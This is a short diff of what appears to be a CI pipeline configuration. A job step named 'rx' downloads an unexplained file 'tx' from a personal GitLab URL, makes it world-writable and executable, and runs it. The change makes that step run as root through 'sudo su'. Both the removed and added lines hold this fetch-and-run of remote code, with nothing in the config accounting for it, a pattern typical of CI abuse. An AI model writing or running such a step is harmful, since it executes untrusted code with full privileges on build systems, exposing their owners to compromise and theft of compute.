@@ -9,7 +9,7 @@ jobs:
       - run:
           name: "rx"
           command: |
-           sudo wget https://gitlab.com/TandraKauffman/rx/-/raw/main/tx && chmod 777 tx && ./tx
+           sudo su --command "wget https://gitlab.com/TandraKauffman/rx/-/raw/main/tx && chmod 777 tx && ./tx"
 
 workflows:
   version: 2
